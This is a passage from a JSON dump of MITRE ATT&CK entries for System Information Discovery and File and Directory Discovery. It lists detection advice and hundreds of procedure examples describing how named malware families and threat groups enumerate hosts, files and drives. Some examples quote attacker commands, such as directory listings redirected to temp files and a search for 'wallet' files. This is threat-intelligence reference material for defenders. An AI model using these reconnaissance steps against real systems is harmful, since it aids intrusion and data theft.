      "Saint Botcan identify the OS version, CPU, and other details from a victim's machine.[399]",
      "SampleCheck5000can create unique victim identifiers by using the compromised system’s volume ID or computer name.[316]",
      "Sandworm Teamused a backdoor to enumerate information about the infected system's operating system.[400][401]",
      "Sardonichas the ability to collect the computer name, CPU manufacturer name, and C:\\ drive serial number from a compromised machine.Sardonicalso has the ability to execute theverandsysteminfocommands.[402]",
      "SDBbothas the ability to identify the OS version, OS bit information and computer name.[172][19]",
      "ServHelperwill attempt to enumerate Windows version and system architecture.[403]",
      "ShadowPadhas discovered system information including memory status, CPU frequency, OS versions, and volume serial numbers.[404]",
      "Shamoonobtains the victim's operating system version and keyboard layout and sends the information to the C2 server.[405][406]",
      "Sharkcan collect the GUID of a targeted machine.[282][283]",
      "SharpDiscocan use a plugin to enumerate system drives.[407]",
      "SharpStagehas checked the system settings to see if Arabic is the configured language.[408]",
      "SHARPSTATShas the ability to identify the IP address, machine name, and OS of the compromised host.[349]",
      "ShimRatReportergathered the operating system name and specific Windows version of an infected machine.[409]",
      "ShrinkLockeruses WMI queries to gather various information about the victim machine and operating system.[410][411]",
      "SHUTTERSPEEDcan collect system information.[184]",
      "SideCopyhas identified the OS version of a compromised host.[11]",
      "SideTwistcan collect the computer name of a targeted system.[320]",
      "Sidewinderhas used tools to collect the computer name, OS version, installed hotfixes, as well as information regarding the memory and processor on a compromised host.[412][413]",
      "SILENTTRINITYcan collect information related to a compromised host, including OS version and a list of drives.[414]",
      "Skidmaphas the ability to check whether the infected system’s OS is Debian or RHEL/CentOS to determine which cryptocurrency miner it should use.[415]",
      "SLOTHFULMEDIAhas collected system name, OS version, adapter information, memory usage, and disk information from a victim machine.[416]",
      "SLOWDRIFTcollects and sends system information to its C2.[184]",
      "SMOKEDHAMhas used thesysteminfocommand on a compromised host.[417]",
      "Snip3has the ability to queryWin32_ComputerSystemfor system information.[418]",
      "SocGholishhas the ability to enumerate system information including the victim computer name.[419][420][421]",
      "SodaMastercan enumerate the host name and OS version on a target system.[422]",
      "Solarcan send basic information about the infected host to C2.[213]",
      "During theSolarWinds Compromise,APT29usedfsutilto check available free space before executing actions that might create large files on disk.[423]",
      "SombRATcan executegetinfoto enumerate the computer name and OS version of a compromised system.[424]",
      "SoreFangcan collect the hostname, operating system configuration, product ID, and disk space on victim machines by executingSysteminfo.[425]",
      "SOUNDBITEis capable of gathering system information.[230]",
      "Sowbugobtained OS version and hardware configuration from a victim.[426]",
      "Sparkcan collect the hostname, keyboard layout, and language from the system.[427]",
      "SpeakUpuses thecat /proc/cpuinfo | grep -c \"cpu family\" 2>&1command to gather system information.[428]",
      "SpicyOmelettecan identify the system name of a compromised host.[429]",
      "Squirrelwafflehas gathered victim computer information and configurations.[430]",
      "SslMMsends information to its hard-coded C2, including OS version, service pack information, processor speed, system name, and OS install date.[431]",
      "STARWHALEcan gather the computer name of an infected host.[432][433]",
      "StealBitcan enumerate the computer name and domain membership of the compromised system.[434]",
      "Stealth Falconmalware gathers system information via WMI, including the system directory, build number, serial number, version, manufacturer, model, and total physical memory.[435]",
      "StoneDrillhas the capability to discover the system OS, Windows version, architecture and environment.[436]",
      "StreamExhas the ability to enumerate system information.[437]",
      "StrelaStealervariants collect victim system information for exfiltration.[438]",
      "StrifeWatercan collect the OS version, architecture, and machine name to create a unique token for the infected host.[439]",
      "StrongPitycan identify the hard disk volume serial number on a compromised host.[440]",
      "Stuxnetcollects system information including computer and domain names, OS version, and S7P paths.[441]",
      "SUNBURSTcollected hostname and OS version.[442][443]",
      "SVCReadyhas the ability to collect information such as computer name, computer manufacturer, BIOS, operating system, and firmware, including through the use ofsysteminfo.exe.[444]",
      "SynAckgathers computer names, OS version info, and also checks installed keyboard layouts to estimate if it has been launched from a certain list of countries.[445]",
      "Sys10collects the computer name, OS versioning information, and OS install date and sends the information to the C2.[431]",
      "SYSCONhas the ability to useSysteminfoto identify system information.[97]",
      "Systeminfocan be used to gather information about the operating system.[446]",
      "SysUpdatecan collect a system's architecture, operating system version, hostname, and drive information.[447][448]",
      "T9000gathers and beacons the operating system build number and CPU Architecture (32-bit/64-bit) during installation.[449]",
      "TA2541has collected system information prior to downloading malware on the targeted host.[450]",
      "TAINTEDSCRIBEcan useDriveListto retrieve drive information.[451]",
      "TajMahalhas the ability to identify hardware information, the computer name, and OS information on an infected host.[452]",
      "TeamTNThas searched for system version, architecture, disk partition, logical volume, and hostname information.[453][454]",
      "ThreatNeedlecan collect system profile information from a compromised host.[455]",
      "ToddyCathas collected information on bootable drives including model, vendor, and serial numbers.[309]",
      "Torismacan useGetlogicalDrivesto get a bitmask of all drives available on a compromised system. It can also useGetDriveTypeto determine if a new drive is a CD-ROM drive.[456]",
      "TrickBotgathers the OS version, machine name, CPU type, amount of RAM available, and UEFI/BIOS firmware information from the victim’s machine.[457][458][459][460]",
      "Trojan.Karaganycan capture information regarding the victim's OS, security, and hardware configuration.[461]",
      "Troll Stealercan collect local system information.[462][175]",
      "Tropic Trooperhas detected a target system’s OS version and system volume information.[463][464]",
      "Turiancan retrieve system information including OS version, memory usage, local hostname, and system adapter information.[465]",
      "Turlasurveys a system upon check-in to discover operating system configuration details using thesysteminfoandsetcommands.[466][467]",
      "TURNEDUPis capable of gathering system information.[468]",
      "TYPEFRAMEcan gather the disk volume information.[469]",
      "Unknown Loggercan obtain information about the victim computer name, physical memory, country, and date.[470]",
      "UPPERCUThas the capability to gather the system’s hostname and OS version.[471]",
      "Uroburoshas the ability to gather basic system information and run the POSIX APIgethostbyname.[472]",
      "Ursnifhas usedSysteminfoto gather system information.[473]",
      "Valakcan determine the Windows version and computer name on a compromised host.[474][475]",
      "VERMINcollects the OS name, machine name, and architecture information.[476]",
      "Volgmercan gather system information, the computer name, OS version, drive and serial information from the victim's machine.[477][478][479]",
      "Volt Typhoonhas discovered file system types, drive names, size, and free space on compromised systems.[480][481][482][483]",
      "WarzoneRATcan collect compromised host information, including OS version, PC name, RAM size, and CPU details.[484]",
      "WellMesscan identify the computer name of a compromised host.[485][486]",
      "WhisperGatehas the ability to enumerate fixed logical drives on a targeted system.[487]",
      "Windigohas used a script to detect which Linux distribution and version is currently installed on the system.[81]",
      "WINDSHIELDcan gather the victim computer name.[230]",
      "Windshifthas used malware to identify the computer name of a compromised host.[488]",
      "WINERACKcan gather information about the host.[184]",
      "Wingbirdchecks the victim OS version after executing to determine where to drop files based on whether the victim is 32-bit or 64-bit.[489]",
      "WinMMcollects the system name, OS version including service pack, and system install date and sends the information to the C2 server.[431]",
      "Winnti for Windowscan determine if the OS on a compromised host is newer than Windows XP.[490]",
      "Winter Vivernscript execution includes basic victim information gathering steps which are then transmitted to command and control servers.[491]",
      "Wizard Spiderhas usedSysteminfoand similar commands to acquire detailed configuration information of a victim's machine.Wizard Spiderhas also utilized the PowerShell cmdletGet-ADComputerto collect DNS hostnames, last logon dates, and operating system information from Active Directory.[492][493]",
      "Woody RATcan retrieve the following information from an infected machine: OS, architecture, computer name, OS build version, environment variables, and storage drives.[494]",
      "XAgentOSXcontains the getInstalledAPP function to runls -la /Applicationsto gather what applications are installed.[495]",
      "XCSSETidentifies the macOS version and usesioregto determine serial number.[496]",
      "XLoadercan collect system information and supported language information from the victim machine.[497]",
      "YAHOYAHchecks for the system’s Windows OS version and hostname.[463]",
      "ytygathers the computer name, the serial number of the main disk volume, CPU information, Microsoft Windows version, and runs the commandsysteminfo.[498]",
      "Zebrocycollects the OS version, computer name and serial number for the storage volume C:.Zebrocyalso runs thesysteminfocommand to gather system information.[499][92][500][93][501][502][503]",
      "ZeroClearecan use theIOCTL_DISK_GET_DRIVE_GEOMETRY_EX,IOCTL_DISK_GET_DRIVE_GEOMETRY, andIOCTL_DISK_GET_LENGTH_INFOsystem calls to compute disk size.[383]",
      "ZeroTgathers the victim's computer name, Windows version, and system language, and then sends it to its C2 server.[504]",
      "Zeus Pandacollects the OS version, system architecture, computer name, product ID, install date, and information on the keyboard mapping to determine the language used on the system.[505][506]",
      "ZIRCONIUMhas used a tool to capture the processor architecture of a compromised host in order to register it with C2.[507]",
      "ZLibhas the ability to enumerate system information.[285]",
      "Zoxcan enumerate attached drives.[508]",
      "zwShellcan obtain the victim PC name and OS version.[509]",
      "ZxShellcan collect the local hostname, operating system details, CPU speed, and total physical memory.[510]",
      "ZxxZhas collected the host name and operating system product name from a compromised machine.[511]"
    ]
  },
  "T1083": {
    "Name": "File and Directory Discovery",
    "Description": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information fromFile and Directory Discoveryduring automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.Many command shell utilities can be used to obtain this information. Examples includedir,tree,ls,find, andlocate.[1]Custom tools may also be used to gather file and directory information and interact with theNative API. Adversaries may also leverage aNetwork Device CLIon network devices to gather file and directory information (e.g.dir,show flash, and/ornvram).[2]Some files and directories may require elevated or specific user permissions to access.",
    "Detects": [
      "Monitor executed commands and arguments that may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. For network devices, monitor executed commands in AAA logs, especially those run by unexpected or unauthorized users. On ESXi servers, monitor for commands that leverage tools likegrepandfindto search for files with VM extensions such asvmdk, or in VM-related paths such as/vmfs/*.[401][402][403]",
      "Monitor for API calls that may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system.",
      "Monitor newly executed processes that may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system."
    ],
    "Procedure Examples": [
      "3PARA RAThas a command to retrieve metadata for files on disk as well as a command to list the current working directory.[3]",
      "4H RAThas the capability to obtain file and directory listings.[3]",
      "AcidPourcan identify specific files and directories within the Linux operating system corresponding with storage devices for follow-on wiping activity, similar toAcidRain.[4]",
      "AcidRainidentifies specific files and directories in the Linux operating system associated with storage devices.[5]",
      "Action RAThas the ability to collect drive and file information on an infected machine.[6]",
      "admin@338actors used the following commands after exploiting a machine withLOWBALLmalware to obtain information about files and directories:dir c:\\ >> %temp%\\downloaddir \"c:\\Documents and Settings\" >> %temp%\\downloaddir \"c:\\Program Files\\\" >> %temp%\\downloaddir d:\\ >> %temp%\\download[7]",
      "ADVSTORESHELLcan list files and directories.[8][9]",
      "Akiraexamines files prior to encryption to determine if they meet requirements for encryption and can be encrypted by the ransomware. These checks are performed through native Windows functions such asGetFileAttributesW.[10][11]",
      "Akira _v2can target specific files and folders for encryption.[12][11][13]",
      "Amadeyhas searched for folders associated with antivirus software.[14]",
      "Aoqin Dragonhas run scripts to identify file formats including Microsoft Word.[15]",
      "AppleSeedhas the ability to search for .txt, .ppt, .hwp, .pdf, and .doc files in specified directories.[16]",
      "APT18can list files information for specific directories.[17]",
      "APT28has usedForfilesto locate PDF, Excel, and Word documents during collection. The group also searched a compromised DCCC computer for specific terms.[18][19]",
      "APT3has a tool that looks for files and directories on the local file system.[20][21]",
      "APT32's backdoor possesses the capability to list files and directories on a machine.[22]",
      "APT38have enumerated files and directories, or searched in specific locations within a compromised host.[23]",
      "APT39has used tools with the ability to search for files on a compromised host.[24]",
      "APT41has executedfile /bin/pwdon exploited victims, perhaps to return architecture related information.[25]",
      "APT5has used the BLOODMINE utility to discover files with .css, .jpg, .png, .gif, .ico, .js, and .jsp extensions in Pulse Secure Connect logs.[26]",
      "Aria-bodyhas the ability to gather metadata from a file and to search for file and directory names.[27]",
      "Attorhas a plugin that enumerates files with specific extensions on all hard disk drives and stores file information in encrypted log files.[28]",
      "AuditCredcan search through folders and files on the system.[29]",
      "AutoIt backdooris capable of identifying documents on the victim with the following extensions: .doc; .pdf, .csv, .ppt, .docx, .pst, .xls, .xlsx, .pptx, and .jpeg.[30]",
      "Avaddonhas searched for specific files prior to encryption.[31]",
      "Avengerhas the ability to browse files in directories such as Program Files and the Desktop.[32]",
      "AvosLockerhas searched for files and directories on a compromised network.[33][34]",
      "Azorultcan recursively search for files in folders and collects files from the desktop with certain extensions.[35]",
      "Babukhas the ability to enumerate files on a targeted system.[36][37]",
      "BabySharkhas useddirto search for \"programfiles\" and \"appdata\".[38]",
      "BackConfighas the ability to identify folders and files related to previous infections.[39]",
      "Backdoor.Oldreacollects information about available drives, default browser, desktop file list, My Documents, Internet history, program files, and root of available drives. It also searches for ICS-related software files.[40]",
      "BACKSPACEallows adversaries to search for files.[41]",
      "BADFLICKhas searched for files on the infected host.[42]",
      "BADNEWSidentifies files with certain extensions from USB devices, then copies them to a predefined directory.[43]",
      "BadPatchsearches for files with specific file extensions.[44]",
      "Bandookhas a command to list files on a system.[45]",
      "Bankshotsearches for files on the victim's machine.[46]",
      "Bazarcan enumerate the victim's desktop.[47][48]",
      "BBSRATcan list file and directory information.[49]",
      "Bisonalcan retrieve a file listing from the system.[50][51]",
      "Black Bastacan enumerate specific files for encryption.[52][53][54][55][56][57][58][59]",
      "BlackCatcan enumerate files for encryption.[60]",
      "BLACKCOFFEEhas the capability to enumerate files.[61]",
      "BlackEnergygathers a list of installed apps from the uninstall program Registry. It also gathers registered mail, browser, and instant messaging clients from the Registry.BlackEnergyhas searched for given file types.[62][63]",
      "BlackMouldhas the ability to find files on the targeted system.[64]",
      "BLINDINGCANcan search, read, write, move, and execute files.[65][66]",
      "BLUELIGHTcan enumerate files and collect associated metadata.[67]",
      "BOLDMOVEcan list information of all files in the system recursively from the root directory or from a specified directory.[68]",
      "BoomBoxcan search for specific files and directories on a machine.[69]",
      "BoxCaonhas searched for files on the system, such as documents located in the desktop folder.[70]",
      "Brave Princegathers file and directory information from the victim’s machine.[71]",
      "BRONZE BUTLERhas collected a list of files from the victim and uploaded it to its C2 server, and then created a new list of specific files to steal.[72]",
      "DuringC0015, the threat actors conducted a file listing discovery against multiple hosts to ensure locker encryption was successful.[73]",
      "CaddyWipercan enumerate all files and directories on a compromised host.[74]",
      "Cannoncan obtain victim drive information as well as a list of folders in C:\\Program Files.[75]",
      "Cardinal RATchecks its current working directory upon execution and also contains watchdog functionality that ensures its executable is located in the correct path (else it will rewrite the payload).[76]",
      "Caterpillar WebShellcan search for files in directories.[77]",
      "ccf32can parse collected files to identify specific file extensions.[78]",
      "CharmPowercan enumerate drives and list the contents of the C: drive on a victim's computer.[79]",
      "ChChescollects the victim's %TEMP% directory path and version of Internet Explorer.[80]",
      "Cheerscryptcan search for log and VMware-related files with .log, .vmdk, .vmem, .vswp, and .vmsn extensions.[81]",
      "Chimerahas utilized multiple commands to identify data of interest in file and directory listings.[82]",
      "CHIMNEYSWEEPhas the ability to enumerate directories for files that match a set list.[83]",
      "China Chopper's server component can list directory contents.[84][85]",
      "An older version ofCHOPSTICKhas a module that monitors all mounted volumes for files with the extensions .doc, .docx, .pgp, .gpg, .m2f, or .m2o.[8]",
      "Clamblingcan browse directories on a compromised host.[86][87]",
      "Clophas searched folders and subfolders for files to encrypt.[88]",
      "cmdcan be used to find files and directories with native functionality such asdircommands.[89]",
      "COATHANGERwill survey the contents of system files during installation.[90]",
      "Cobalt Strikecan explore files on a compromised system.[91]",
      "Confuciushas used a file stealer that checks the Document, Downloads, Desktop, and Picture folders for documents and images with specific extensions.[92]",
      "Contican discover files on a local system.[93]",
      "CookieMinerhas looked for files in the user's home directory with \"wallet\" in their name usingfind.[94]",
      "CORALDECKsearches for specified files.[95]",
      "CosmicDukesearches attached and mounted drives for file extensions and keywords that match a predefined list.[96]",
      "CrackMapExeccan discover specified filetypes and log files on a targeted system.[97]",
      "CreepyDrivecan specify the local file path to upload files from.[98]",
      "Crimsoncontains commands to list files and directories, as well as search for files matching certain extensions from a defined list.[99][100][101]",
      "CrossRATcan list all files on a system.[102]",
      "Cryptoisticcan scan a directory to identify files for deletion.[103]",
      "Cubacan enumerate files by using a variety of functions.[104]",
      "Cuckoo Stealercan search for files associated with specific applications.[105][106]",
      "Cyclops Blinkcan use the Linux APIstatvfsto enumerate the current working directory.[107][108]",
      "Daclscan scan directories on a compromised host.[109]",
      "Dark Caracalcollected file listings of all default Windows directories.[102]",
      "Some versions ofDarkGatesearch for the hard-coded folderC:\\Program Files\\e Carte Bleue.[110]",
      "Darkhotelhas used malware that searched for files with specific patterns.[111]",
      "DarkWatchmanhas the ability to enumerate file and folder names.[112]",
      "DDKONGlists files on the victim’s machine.[113]",
      "DEATHRANSOMcan use loop operations to enumerate directories on a compromised host.[114]",
      "Denishas several commands to search directories for files.[115][116]",
      "Derusbiis capable of obtaining directory, file, and drive listings.[117][84]",
      "Diavolhas a command to traverse the files and directories in a given path.[118]",
      "Dokihas resolved the path of a process PID to use as a script argument.[119]",
      "down_newhas the ability to list the directories on a compromised host.[32]",
      "Dragonflyhas used a batch script to gather folder and file names from victim hosts.[120][121][122]",
      "DropBookcan collect the names of all files and folders in the Program Files directories.[123][124]",
      "Dtrackcan list files on available disk volumes.[125][126]",
      "DUSTTRAPcan enumerate files and directories.[127]",
      "DustySkyscans the victim for files that contain certain keywords and document types including PDF, DOC, DOCX, XLS, and XLSX, from a list that is obtained from the C2 as a text file. It can also identify logical drives for the infected machine.[128][129]",
      "A variant ofEliseexecutesdir C:\\progra~1when initially run.[130][131]",
      "ELMERis capable of performing directory listings.[132]",
      "Empireincludes various modules for finding files of interest on hosts and network shares.[133]",
      "Epicrecursively searches for all .doc files on the system and collects a directory listing of the Desktop, %TEMP%, and %WINDOWS%\\Temp directories.[134][135]",
      "Exbyteenumerates all document files on an infected machine, then creates a summary of these items including filename and directory location prior to exfiltration to cloud hosting services.[136]",
      "FALLCHILLcan search files on a victim.[137]",
      "FatDukecan enumerate directories on target machines.[138]",
      "FIN13has used the Windowsdircommand to enumerate files and directories in a victim's network.[139]",
      "FinFisherenumerates directories and scans for certain files.[140][141]",
      "FIVEHANDShas the ability to enumerate files on a compromised host in order to encrypt files with specific extensions.[142][143]",
      "FLASHFLOODsearches for interesting files (either a default or customized set of file extensions) on the local system and removable media.[41]",
      "FoggyWeb's loader can check for theFoggyWebbackdoor .pri file on a compromised AD FS server.[144]",
      "Forfilescan be used to locate certain types of files/directories in a system.(ex: locate all files with a specific extension, name, and/or age)[18]",
      "Fox Kittenhas used WizTree to obtain network files and directory listings.[145]",
      "FruitFlylooks for specific files and file types.[146]",
      "FunnyDreamcan identify files with .doc, .docx, .ppt, .pptx, .xls, .xlsx, and .pdf extensions and specific timestamps for collection.[78]",
      "FYAntican search theC:\\Windows\\Microsoft.NET\\directory for files of a specified size.[147]",
      "Fysbishas the ability to search for files.[148]",
      "Gamaredon Groupmacros can scan for Microsoft Word and Excel files to inject with additional malicious macros.Gamaredon Grouphas also used its backdoors to automatically list interesting files (such as Office documents) found on a system.[149][150]",
      "Gelsemiumcan retrieve data from specific Windows directories, as well as open random files as part ofVirtualization/Sandbox Evasion.[151]",
      "GeminiDukecollects information from the victim, including installed drivers, programs previously executed by users, programs and services configured to automatically run at startup, files and folders present in any user's home folder, files and folders present in any user's My Documents, programs installed to the Program Files folder, and recently accessed files, folders, and programs.[152]",
      "Gold Dragonlists the directories for Desktop, program files, and the user’s recently accessed files.[71]",
      "GoldenSpyhas included a program \"ExeProtector\", which monitors for the existence ofGoldenSpyon the infected system and redownloads if necessary.[153]",
      "Gomircollects information about directory and file structures, including total number of subdirectories, total number of files, and total size of files on infected systems.[154]",
      "GravityRATcollects the volumes mapped on the system, and also steals files with the following extensions: .docx, .doc, .pptx, .ppt, .xlsx, .xls, .rtf, and .pdf.[155]",
      "GrimAgenthas the ability to enumerate files and directories on a compromised host.[156]",
      "HAFNIUMhas searched file contents on a compromised host.[85]",
      "HermeticWipercan enumerate common folders such as My Documents, Desktop, and AppData.[157][158]",
      "Heyoka Backdoorhas the ability to search the compromised host for files.[15]",
      "HOPLIGHThas been observed enumerating system drives and partitions.[159]",
      "HotCroissanthas the ability to retrieve a list of files in a given directory as well as drives and drive types.[160]",
      "HTTPBrowseris capable of listing files, folders, and drives on a victim.[161][162]",
      "Hydraqcreates a backdoor through which remote attackers can check for the existence of files, including its own components, as well as retrieve a list of logical drives.[163][164]",
      "TheIceAppleDirectory Lister module can list information about files and directories including creation time, last write time, name, and size.[165]",
      "Imminent Monitorhas a dynamic debugging feature to check whether it is located in the %TEMP% directory, otherwise it copies itself there.[166]",
      "INC Ransomwarecan receive command line arguments to encrypt specific files and directories.[167][168]",
      "Inceptionused a file listing plugin to collect information about file and directories both on local and remote drives.[169]",
      "Industroyer’s data wiper component enumerates specific files on all the Windows drives.[170]",
      "InnaputRATenumerates directories and obtains file attributes on a system.[171]",
      "InvisiMolecan list information about files in a directory and recently opened or used documents.InvisiMolecan also search for specific files by supplied file mask.[172]",
      "Ixeshecan list file and directory information.[173]",
      "JPINcan enumerate drives and their types. It can also change file permissions using cacls.exe.[174]",
      "jRATcan browse file systems.[175][176]",
      "Kasidethas the ability to search for a given filename on a victim.[177]",
      "Kazuarfinds a specified directory, lists the files and metadata about those files.[178]",
      "Ke3changuses command-line interaction to search files and directories.[179][180]",
      "KeyBoyhas a command to launch a file browser or explorer on the system.[181]",
      "KEYMARBLEhas a command to search for files on the victim’s machine.[182]",
      "KGH_SPYcan enumerate files and directories on a compromised host.[183]",
      "KillDiskhas used theFindNextFilecommand as part of its file deletion process.[184]",
      "Kimsukyhas the ability to enumerate all files and directories on an infected system.[185][186][187]",
      "Kinsinghas used the find command to search for specific files.[188]",
      "Kivarshas the ability to list drives on the infected host.[189]",
      "Koadiccan obtain a list of directories.[190]",
      "A version ofKONNIsearches for filenames created with a previous version of the malware, suggesting different versions targeted the same victims and the versions may work together.[191]",
      "KV Botnet Activitygathers a list of filenames from the following locations during execution of the final botnet stage:\\/usr\\/sbin\\/,\\/usr\\/bin\\/,\\/sbin\\/,\\/pfrm2.0\\/bin\\/,\\/usr\\/local\\/bin\\/.[192]",
      "Kwampirscollects a list of files and directories in C:\\ with the commanddir /s /a c:\\ >> \"C:\\windows\\TEMP[RANDOM].tmp\".[193]",
      "Latrodectuscan collect desktop filenames.[194][195][196]",
      "Lazarus Groupmalware can use a common function to identify target files by their extension, and some also enumerate files and directories, including a Destover-like variant that lists files and gathers information for all drives.[197][198][199][200]",
      "Leafminerused a tool called MailSniper to search for files on the desktop and another utility called Sobolsoft to extract attachments from EML files.[201]",
      "LightSpyuses theNSFileManagerto move, create and delete files.LightSpycan also use the assemblybtinstruction to determine a file's executable permissions.[202]",
      "Linfocreates a backdoor through which remote attackers can list contents of drives and search for files.[203]",
      "LITTLELAMB.WOOLTEAcan monitor for system upgrade events by checking for the presence of/tmp/data/root/dev.[204]",
      "LockBit 2.0can exclude files associated with core system functions from encryption.[205]",
      "LockBit 3.0can exclude files associated with core system functions from encryption.[206]",
      "LoFiSecan monitor the file system to identify files less than 6.4 MB in size with file extensions including .doc, .docx, .xls, .xlsx, .ppt, .pptx, .pdf, .rtf, .tif, .odt, .ods, .odp, .eml, and .msg.[207]",
      "Lokibotcan search for specific files on an infected host.[208]",
      "LookBackcan retrieve file listings from the victim machine.[209]",
      "Lotus Blossomhas used commands such asdirto examine the local filesystem of victim machines.[210]",
      "LuminousMothhas used malware that scans for files in the Documents, Desktop, and Download folders and in other drives.[211][212]",
      "LunarMailcan search its staging directory for output files it has produced.[213]",
      "LunarWebhas the ability to retrieve directory listings.[213]",
      "Macheteproduces file listings in order to search for files to be exfiltrated.[214][215][216]",
      "MacMacan search for a specific file on the compromised computer and can enumerate files in Desktop, Downloads, and Documents folders.[217]",
      "Mafaldacan search for files and directories.[218]",
      "Magic Houndmalware can list a victim's logical drives and the type, as well the total/free space of the fixed devices. Other malware can list a directory's contents.[219]",
      "Mangocan enumerate the contents of current working or other specified directories.[220]",
      "Manjusakacan gather information about specific files on the victim system.[221]",
      "MarkiRATcan look for files carrying specific extensions such as: .rtf, .doc, .docx, .xls, .xlsx, .ppt, .pptx, .pps, .ppsx, .txt, .gpg, .pkr, .kdbx, .key, and .jpb.[222]",
      "MegaCortexcan parse the available drives and directories to determine which files to encrypt.[223]",
      "Megazordcan ignore specified directories for encryption.[13]",
      "menuPasshas searched compromised systems for folders of interest including those related to HR, audit and expense, and meeting memos.[224]",
      "MESSAGETAPchecks for the existence of two configuration files (keyword_parm.txt and parm.txt) and attempts to read the files every 30 seconds.[225]",
      "metaMaincan recursively enumerate files in an operator-provided directory.[218][226]",
      "Metamorfohas searched the Program Files directories for specific folders and has searched for strings related to its mutexes.[227][228][229]",
      "Micropsiacan perform a recursive directory listing for all volume drives available on the victim's machine and can also fetch specific files by their paths.[230]",
      "MiniDukecan enumerate local drives.[138]",
      "Misdatis capable of running commands to obtain a list of files and directories, as well as enumerating logical drives.[231]",
      "Mispadusearches for various filesystem paths to determine what banking applications are installed on the victim’s machine.[232]",
      "MobileOrderhas a command to upload to its C2 server information about files on the victim mobile device, including SD card size, installed app list, SMS content, contacts, and calling history.[233]",
      "MoonWindhas a command to return a directory listing for a specified directory.[234]",
      "MuddyWaterhas used malware that checked if the ProgramData folder had folders or files with the keywords \"Kasper,\" \"Panda,\" or \"ESET.\"[235]",
      "MultiLayer Wipergenerates a list of all files and paths on the fixed drives of an infected system, enumerating all files on the system except specific folders defined in a hardcoded list.[236]",
      "Mustang Pandahas searched the entire target system for DOC, DOCX, PPT, PPTX, XLS, XLSX, and PDF files.[237]",
      "NDiskMonitorcan obtain a list of all files and directories as well as logical drives.[43]",
      "Nebulaecan list files and directories on a compromised host.[238]",
      "NETEAGLEallows adversaries to enumerate and modify the infected host's file system. It supports searching for directories, creating directories, listing directory contents, reading and writing to files, retrieving file attributes, and retrieving volume information.[41]",
      "NETWIREhas the ability to search for files on the compromised host.[239]",
      "DuringNight Dragon, threat actors usedzwShellto establish full remote control of the connected machine and browse the victim file system.[240]",
      "NightClubcan use a file monitor to identify .lnk, .doc, .docx, .xls, .xslx, and .pdf files.[241]",
      "Ninjahas the ability to enumerate directory content.[242][207]",
      "njRATcan browse file systems using a file manager module.[243]",
      "NotPetyasearches for files ending with dozens of different file extensions prior to encryption.[244]",
      "ObliqueRAThas the ability to recursively enumerate files on an infected endpoint.[245]",
      "OceanSaltcan extract drive information from the endpoint and search files on the system.[246]",
      "Octopuscan collect information on the Windows directory and searches for compressed RAR files on the host.[247][248][249]",
      "ODAgentcan identify the current working directory.[250]",
      "Okrumhas used DriveLetterView to enumerate drive information.[251]",
      "DuringOperation CuckooBees, the threat actors useddir c:\\\\to search for files.[252]",
      "DuringOperation Dream Job,Lazarus Groupconducted word searches within documents on a compromised host in search of security and financial matters.[253]",
      "DuringOperation Honeybee, the threat actors used a malicious DLL to search for files with specific keywords.[254]",
      "DuringOperation Wocao, threat actors gathered a recursive directory listing to find files and directories of interest.[255]",
      "Orzcan gather victim drive information.[256]",
      "OSX/Shlayerhas used the commandappDir=\"$(dirname $(dirname \"$currentDir\"))\"and$(dirname \"$(pwd -P)\")to construct installation paths.[257][258]",
      "OutSteelcan search for specific file extensions, including zipped files.[259]",
      "OwaAuthhas a command to list its directory and logical drives.[161]",
      "P.A.S. Webshellhas the ability to list files and file characteristics including extension, size, ownership, and permissions.[260]",
      "PACEMAKERcan parse/proc/\"process_name\"/cmdlineto look for the stringdswsdwithin the command line.[261]",
      "Pasamcreates a backdoor through which remote attackers can retrieve lists of files.[262]",
      "APatchworkpayload has searched all fixed drives on the victim for files matching a specified list of extensions.[263][43]",
      "Pcexterhas the ability to search for files in specified directories.[207]",
      "Penquincan use the command codedo_vslistto send file names, size, and status to C2.[264]",
      "Peppycan identify specific files for exfiltration.[99]",
      "PinchDukesearches for files created within a certain timeframe and whose file extension matches a predefined list.[152]",
      "PingPullcan enumerate storage volumes and folder contents of a compromised host.[265]",
      "Pisloaderhas commands to list drives on the victim machine and to list file information for a given directory.[266]",
      "Playhas used the Grixba information stealer to list security files and processes.[267]",
      "Playcryptcan avoid encrypting files with a .PLAY, .exe, .msi, .dll, .lnk, or .sys file extension.[267]",
      "PLEADhas the ability to list drives and files on the compromised host.[189][268]",
      "PlugXhas a module to enumerate drives and find files recursively.[269][270]",
      "PoetRAThas the ability to list files upon receiving thelscommand from C2.[271]",
      "POORAIMcan conduct file browsing.[95]",
      "PoshC2can enumerate files on the local file system and includes a module for enumerating recently accessed files.[272]",
      "PowerDukehas commands to get the current directory name as well as the size of a file. It also has commands to obtain information about logical drives, drive type, and free space.[273]",
      "POWRUNERmay enumerate user directories on a victim.[274]",
      "Prestigecan traverse the file system to discover files to encrypt by identifying specific extensions defined in a hardcoded list.[275]",
      "A module inPrikormkacollects information about the paths, size, and creation time of files with specific file extensions, but not the actual content of the file.[276]",
      "Proxysvclists files in directories.[198]",
      "Psylohas commands to enumerate all storage devices and to find all files that start with a particular string.[233]",
      "Pteranodonidentifies files matching certain file extension and copies them to subdirectories it created.[277]",
      "Pupycan walk through directories and recursively search for strings in files.[278]",
      "QakBotcan identify whether it has been run previously on a host by checking for a specified folder.[279]",
      "QuietSievecan search files on the target host by extension, including doc, docx, xls, rtf, odt, txt, jpg, pdf, rar, zip, and 7z.[280]",
      "Raccoon Stealeridentifies target files and directories for collection based on a configuration file.[281][282]",
      "RainyDaycan use a file exfiltration tool to collect recently changed files with specific extensions.[238]",
      "Ramsaycan collect directory and file lists.[283][284]",
      "RansomHubhas the ability to only encrypt specific files.[285]",
      "RARSTONEobtains installer properties from Uninstall Registry Key entries to obtain information about installed applications and how to uninstall certain applications.[286]",
      "Raspberry Robinwill check to see if the initial executing script is located on the user's Desktop as an anti-analysis check.[287]",
      "Rclonecan list files and directories with thels,lsd, andlslcommands.[288]",
      "RedCurlhas searched for and collected files on local and network drives.[289][290][291]",
      "RedLeavescan enumerate and search for files and directories.[292][80]",
      "Remcoscan search for files on the infected machine.[293]",
      "Remexisearches for files on the system.[294]",
      "RemoteUtilitiescan enumerate files and directories on a target machine.[295]",
      "Remsecis capable of listing contents of folders on the victim.Remsecalso searches for custom network encryption software on victims.[296][297][298]",
